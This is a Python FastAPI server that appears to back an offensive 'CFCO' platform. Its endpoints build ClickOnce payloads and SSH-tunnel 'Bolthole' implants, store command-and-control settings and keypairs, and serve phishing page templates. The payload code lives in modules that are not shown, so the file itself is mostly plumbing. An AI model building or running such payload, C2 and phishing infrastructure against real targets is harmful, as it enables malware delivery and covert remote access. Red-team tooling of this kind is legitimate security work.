import os
import re
import glob
import traceback
import string
import secrets
from datetime import datetime
from fastapi import FastAPI, HTTPException, Request, BackgroundTasks
from fastapi.responses import HTMLResponse


from src.models import CFCOPayload
from src.bolthole_models import BoltholePayload, BoltholeC2ConfigRequest
from src.custom_models import CustomPayload
from src.bolthole_c2store import (
    load_config, save_config,
    load_keypair, generate_keypair, get_or_generate_keypair, get_fingerprint,
)
from src.logging import log_request, GlobalLogger
from src.consts import BUILD_DIR, PHISH_TEMPLATE_DIR, ALLOWED_PHISH_TEMPLATES
from src.builder import build_func
from src.bolthole_builder import bolthole_build_func
from src.custom_builder import custom_build_func

app = FastAPI(title="CFCO API Server")


def _parse_ts(line: str):
    m = re.search(r'\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})', line)
    return m.group(1) if m else None


def _generate_buildid():
    return "".join(
        secrets.choice(string.ascii_letters + string.digits) for _ in range(16)
    )


@app.post("/build")
@app.post("/api/build")
async def build(
    payload: CFCOPayload,
    req: Request,
    background_task: BackgroundTasks):
    """Build CFCO payload"""
    try:
        log_request(req)
        buildid = _generate_buildid()
        GlobalLogger.info("Started build #%s", buildid)

        build_dir = os.path.join(BUILD_DIR, buildid)
        os.makedirs(build_dir, exist_ok=True)

        background_task.add_task(build_func, buildid, payload)

        return {"buildid": buildid}

    except Exception as e:  # pylint: disable=broad-except
        GlobalLogger.error("Exception occured as %s", e)
        GlobalLogger.error("Traceback: %s", traceback.format_exc())
        raise HTTPException(status_code=500)


@app.post("/custom-build")
@app.post("/api/custom-build")
async def custom_build(
    payload: CustomPayload,
    req: Request,
    background_task: BackgroundTasks):
    """Build a custom ClickOnce payload from a user-supplied Program.cs"""
    try:
        log_request(req)
        buildid = _generate_buildid()
        GlobalLogger.info("Started Custom build #%s", buildid)

        build_dir = os.path.join(BUILD_DIR, buildid)
        os.makedirs(build_dir, exist_ok=True)

        background_task.add_task(custom_build_func, buildid, payload)

        return {"buildid": buildid}

    except Exception as e:  # pylint: disable=broad-except
        GlobalLogger.error("Exception occured as %s", e)
        GlobalLogger.error("Traceback: %s", traceback.format_exc())
        raise HTTPException(status_code=500)


@app.post("/bolthole-build")
@app.post("/api/bolthole-build")
async def bolthole_build(
    payload: BoltholePayload,
    req: Request,
    background_task: BackgroundTasks):
    """Build Bolthole SSH-tunnel ClickOnce payload"""
    try:
        log_request(req)
        buildid = _generate_buildid()
        GlobalLogger.info("Started Bolthole build #%s", buildid)

        build_dir = os.path.join(BUILD_DIR, buildid)
        os.makedirs(build_dir, exist_ok=True)

        background_task.add_task(bolthole_build_func, buildid, payload)

        return {"buildid": buildid}

    except Exception as e:  # pylint: disable=broad-except
        GlobalLogger.error("Exception occured as %s", e)
        GlobalLogger.error("Traceback: %s", traceback.format_exc())
        raise HTTPException(status_code=500)


def _keypair_response(pub: str) -> dict:
    return {
        "exists": True,
        "public_key": pub.strip(),
        "fingerprint": get_fingerprint(pub),
    }


@app.get("/builds")
@app.get("/api/builds")
async def list_builds():
    """Return all builds sorted newest-first with status, zip name, and timestamp."""
    results = []
    if not os.path.isdir(BUILD_DIR):
        return results
    with os.scandir(BUILD_DIR) as scanner:
        entries = sorted(scanner, key=lambda e: e.stat().st_mtime, reverse=True)
    for entry in entries:
        if not entry.is_dir():
            continue
        log_path = os.path.join(entry.path, "build.log")
        status = "building"
        ts = None
        if os.path.exists(log_path):
            try:
                with open(log_path, "r", encoding="utf-8", errors="replace") as fh:
                    lines = fh.readlines()
                if lines:
                    ts = _parse_ts(lines[0])
                content = "".join(lines)
                if "Build complete" in content:
                    status = "complete"
                elif "Build failed:" in content:
                    status = "failed"
            except OSError:
                pass
        zips = glob.glob(os.path.join(entry.path, "*.zip"))
        zip_name = os.path.basename(zips[0]) if zips else None
        pkg_name = zip_name.removesuffix(".zip") if zip_name else None
        results.append({
            "buildid": entry.name,
            "name": pkg_name,
            "status": status,
            "zip": zip_name,
            "ts": ts or datetime.fromtimestamp(entry.stat().st_mtime).strftime("%Y-%m-%d %H:%M:%S"),
        })
    return results


@app.get("/bolthole/c2")
@app.get("/api/bolthole/c2")
async def bolthole_c2_get():
    """Return saved global C2 config and outbound keypair status.
    Auto-generates a keypair on first call so the UI always has a public key."""
    try:
        config = load_config()
        _, pub = get_or_generate_keypair()
        return {"config": config, "keypair": _keypair_response(pub)}
    except Exception as e:  # pylint: disable=broad-except
        GlobalLogger.error("bolthole_c2_get error: %s", e)
        raise HTTPException(status_code=500)


@app.get("/phish-template/{name}")
@app.get("/api/phish-template/{name}")
async def get_phish_template(name: str):
    """Return raw phish template HTML for live preview (with {{provider_url}} token intact)."""
    if name not in ALLOWED_PHISH_TEMPLATES:
        raise HTTPException(status_code=404, detail="Unknown phish template")
    path = os.path.join(PHISH_TEMPLATE_DIR, f"{name}.html")
    try:
        with open(path, "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    except FileNotFoundError as exc:
        GlobalLogger.error("Phish template not found: %s", path)
        raise HTTPException(status_code=404) from exc


@app.post("/bolthole/c2")
@app.post("/api/bolthole/c2")
async def bolthole_c2_save(body: BoltholeC2ConfigRequest):
    """Persist C2 config. Rotates the global outbound keypair when regenerate_keypair=true."""
    try:
        config = {
            "ssh_host":          body.ssh_host,
            "ssh_user":          body.ssh_user,
            "ports":             body.ports,
            "tunnel_port_range": body.tunnel_port_range,
            "socks_port":        body.socks_port,
            "startup_delay":     body.startup_delay,
            "reconnect_delay":   body.reconnect_delay,
        }
        save_config(config)

        if body.regenerate_keypair:
            _, pub = generate_keypair()
            GlobalLogger.info("Global outbound keypair rotated")
        else:
            _, pub = get_or_generate_keypair()

        return {"config": config, "keypair": _keypair_response(pub)}
    except Exception as e:  # pylint: disable=broad-except
        GlobalLogger.error("bolthole_c2_save error: %s", e)
        raise HTTPException(status_code=500)
